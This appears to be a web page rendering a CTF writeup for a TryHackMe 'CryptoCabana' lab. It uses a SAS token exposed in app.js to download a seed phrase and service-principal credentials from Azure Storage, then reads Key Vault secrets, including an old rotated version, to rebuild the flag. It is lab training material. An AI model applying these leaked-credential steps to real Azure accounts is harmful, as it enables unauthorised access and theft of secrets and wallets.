@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>cryptocabana · hackerholidays</title>
+<meta name="description" content="CTF writeup: cryptocabana (hackerholidays)" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Serif:wght@400;600;700&family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../css/style.css" />
+<link rel="stylesheet" href="../../css/pygments.css" />
+</head>
+<body>
+<div class="blueprint-grid" aria-hidden="true"></div>
+
+<header class="topbar">
+  <div class="topbar__inner">
+    <a class="topbar__brand" href="../../index.html">
+      <span class="brand-mark">CTF</span>
+      <span class="brand-text">Writeups</span>
+    </a>
+    <div class="topbar__spacer"></div>
+    <div class="topbar__actions">
+      <a class="btn btn--ghost btn--small" href="https://aaadarsh1337.github.io/">&#8592; Portfolio</a>
+      <a class="btn btn--ghost btn--small" href="https://github.com/aaadarsh1337/ctf-writeups" target="_blank" rel="noopener">Repo &#8599;</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<div class="reader-layout reader-layout--static">
+  <aside class="sidebar">
+    <div class="sidebar__head">
+      <a class="btn btn--ghost btn--small" href="../../index.html">&#8592; All writeups</a>
+    </div>
+    <div class="sidebar__challenge">
+      <p class="tb-label">CHALLENGE</p>
+      <h2>cryptocabana</h2>
+      <p class="side-path">hackerholidays</p>
+    </div>
+    <div class="sidebar__files">
+      <p class="tb-label">FILES</p>
+      <div class="file-list"><a class="file-item unreadable" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/cryptocabana/acc" target="_blank" rel="noopener"><span class="name">acc</span><span class="kind">github</span></a><a class="file-item readable" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/cryptocabana/notes.md" target="_blank" rel="noopener"><span class="name">notes.md</span><span class="kind">md</span></a><a class="file-item unreadable" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/cryptocabana/sas" target="_blank" rel="noopener"><span class="name">sas</span><span class="kind">github</span></a><a class="file-item readable" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/cryptocabana/seed_phrase.txt" target="_blank" rel="noopener"><span class="name">seed_phrase.txt</span><span class="kind">txt</span></a></div>
+    </div>
+    <div class="sidebar__foot">
+      <a class="btn btn--ghost btn--small sidebar-gh-btn" href="https://github.com/aaadarsh1337/ctf-writeups/tree/main/hackerholidays/cryptocabana" target="_blank" rel="noopener">Open folder &#8599;</a>
+      <a class="btn btn--ghost btn--small sidebar-gh-btn" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/cryptocabana/notes.md" target="_blank" rel="noopener">View markdown &#8599;</a>
+    </div>
+  </aside>
+  <article class="reader">
+    <div class="reader__toolbar">
+      <div class="reader__crumb">
+        <span class="tb-label">READING</span>
+        <span>notes.md</span>
+      </div>
+      <a class="btn btn--ghost btn--small" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/cryptocabana/notes.md" target="_blank" rel="noopener">Source &#8599;</a>
+    </div>
+    <div class="reader__body">
+      <div class="md-render">
+<h1 id="day-9-cryptocabana">Day 9 - CryptoCabana</h1>
+<h2 id="room-httpstryhackmecomroomhh-cryptocabana-f81cac95">Room: <a href="https://tryhackme.com/room/hh-cryptocabana-f81cac95">https://tryhackme.com/room/hh-cryptocabana-f81cac95</a></h2>
+<p>Hello Hackers!</p>
+<p>Welcome to Day 9 of the TryHackMe Hacker Holidays 2026 writeups.</p>
+<p>This challenge involves Azure Storage, exposed SAS tokens, and Azure Key Vault secrets.</p>
+<p>Inspecting <code>app.js</code> reveals an Azure Storage account and a SAS token:</p>
+<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">STORAGE_ACCOUNT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"cryptocabanaf5scjagc"</span><span class="p">;</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">BACKUPS_CONTAINER</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"backups"</span><span class="p">;</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">BACKUP_SAS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"?sv=2022-11-02&amp;ss=b&amp;srt=sco&amp;sp=rl&amp;se=2099-12-31T23:59:59Z&amp;st=2024-01-01T00:00:00Z&amp;spr=https&amp;sig=..."</span><span class="p">;</span>
+</code></pre></div>
+
+<p>We export the storage account and SAS token:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">AZURE_STORAGE_ACCOUNT</span><span class="o">=</span><span class="s2">"cryptocabanaf5scjagc"</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">AZURE_STORAGE_SAS_TOKEN</span><span class="o">=</span><span class="s2">"..."</span>
+</code></pre></div>
+
+<p>Listing the storage containers reveals:</p>
+<ul>
+<li><code>$web</code></li>
+<li><code>backups</code></li>
+<li><code>vault</code></li>
+</ul>
+<p>The <code>vault</code> and <code>backups</code> containers look interesting, so we check the contents of the vault:</p>
+<div class="highlight"><pre><span></span><code>az<span class="w"> </span>storage<span class="w"> </span>blob<span class="w"> </span>list<span class="w"> </span>--container-name<span class="w"> </span>vault<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>name
+</code></pre></div>
+
+<p>This reveals two files:</p>
+<div class="highlight"><pre><span></span><code>backup-service-account.json
+seed_phrase.txt
+</code></pre></div>
+
+<p>The seed phrase file looks interesting, so we download both files:</p>
+<div class="highlight"><pre><span></span><code>az<span class="w"> </span>storage<span class="w"> </span>blob<span class="w"> </span>download<span class="w"> </span><span class="se">\</span>
+--container-name<span class="w"> </span>vault<span class="w"> </span><span class="se">\</span>
+--name<span class="w"> </span>seed_phrase.txt<span class="w"> </span><span class="se">\</span>
+--file<span class="w"> </span>seed_phrase.txt
+
+az<span class="w"> </span>storage<span class="w"> </span>blob<span class="w"> </span>download<span class="w"> </span><span class="se">\</span>
+--container-name<span class="w"> </span>vault<span class="w"> </span><span class="se">\</span>
+--name<span class="w"> </span>backup-service-account.json<span class="w"> </span><span class="se">\</span>
+--file<span class="w"> </span>backup-service-account.json
+</code></pre></div>
+
+<p>The <code>seed_phrase.txt</code> file contains a 12-word seed phrase.</p>
+<p>The JSON file contains the credentials for an Azure service principal, along with the name of an Azure Key Vault. We use those details to set the required environment variables and log in:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">AZURE_CLIENT_ID</span><span class="o">=</span><span class="s2">"..."</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">AZURE_CLIENT_SECRET</span><span class="o">=</span><span class="s2">"..."</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">AZURE_TENANT_ID</span><span class="o">=</span><span class="s2">"..."</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">AZURE_VAULT_NAME</span><span class="o">=</span><span class="s2">"ccabana-kv-f5scjagc"</span>
+
+az<span class="w"> </span>login<span class="w"> </span><span class="se">\</span>
+--service-principal<span class="w"> </span><span class="se">\</span>
+--username<span class="w"> </span><span class="s2">"</span><span class="nv">$AZURE_CLIENT_ID</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
+--password<span class="w"> </span><span class="s2">"</span><span class="nv">$AZURE_CLIENT_SECRET</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
+--tenant<span class="w"> </span><span class="s2">"</span><span class="nv">$AZURE_TENANT_ID</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
+--allow-no-subscriptions<span class="w"> </span><span class="se">\</span>
+--output<span class="w"> </span>none
+</code></pre></div>
+
+<p>Next, list the secrets in the Key Vault:</p>
+<div class="highlight"><pre><span></span><code>az<span class="w"> </span>keyvault<span class="w"> </span>secret<span class="w"> </span>list<span class="w"> </span><span class="se">\</span>
+--vault-name<span class="w"> </span><span class="s2">"</span><span class="nv">$AZURE_VAULT_NAME</span><span class="s2">"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>name
+</code></pre></div>
+
+<p>The vault contains:</p>
+<div class="highlight"><pre><span></span><code>key-shard-1
+key-shard-2
+key-shard-3
+master-key
+</code></pre></div>
+
+<p>The <code>master-key</code> is forbidden, but the three key shards can be accessed:</p>
+<div class="highlight"><pre><span></span><code>az<span class="w"> </span>keyvault<span class="w"> </span>secret<span class="w"> </span>show<span class="w"> </span><span class="se">\</span>
+--vault-name<span class="w"> </span><span class="s2">"</span><span class="nv">$AZURE_VAULT_NAME</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
+--name<span class="w"> </span>key-shard-1<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>value
+
+az<span class="w"> </span>keyvault<span class="w"> </span>secret<span class="w"> </span>show<span class="w"> </span><span class="se">\</span>
+--vault-name<span class="w"> </span><span class="s2">"</span><span class="nv">$AZURE_VAULT_NAME</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
+--name<span class="w"> </span>key-shard-2<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>value
+
+az<span class="w"> </span>keyvault<span class="w"> </span>secret<span class="w"> </span>show<span class="w"> </span><span class="se">\</span>
+--vault-name<span class="w"> </span><span class="s2">"</span><span class="nv">$AZURE_VAULT_NAME</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
+--name<span class="w"> </span>key-shard-3<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>value
+</code></pre></div>
+
+<p>The first and third shards reveal partial flag values. The second shard contains a message indicating that it was rotated and that the old value may still be recoverable.</p>
+<p>Azure Key Vault keeps previous secret versions, so we list the versions of <code>key-shard-2</code>:</p>
+<div class="highlight"><pre><span></span><code>az<span class="w"> </span>keyvault<span class="w"> </span>secret<span class="w"> </span>list-versions<span class="w"> </span><span class="se">\</span>
+--vault-name<span class="w"> </span><span class="s2">"</span><span class="nv">$AZURE_VAULT_NAME</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
+--name<span class="w"> </span>key-shard-2
+</code></pre></div>
+
+<p>The older version can then be retrieved using its version ID:</p>
+<div class="highlight"><pre><span></span><code>az<span class="w"> </span>keyvault<span class="w"> </span>secret<span class="w"> </span>show<span class="w"> </span><span class="se">\</span>
+--vault-name<span class="w"> </span><span class="s2">"</span><span class="nv">$AZURE_VAULT_NAME</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
+--name<span class="w"> </span>key-shard-2<span class="w"> </span><span class="se">\</span>
+--version<span class="w"> </span>&lt;old-version-id&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>value
+</code></pre></div>
+
+<p>The old value completes the missing section of the flag.</p>
+<p>Combining all three shards reveals the flag:</p>
+<blockquote>
+<p><code>THM{...}</code></p>
+</blockquote>
+<p>Happy Hacking!</p>
+      </div>
+    </div>
+  </article>
+</div>
+
+</main>
+</body>
+</html>
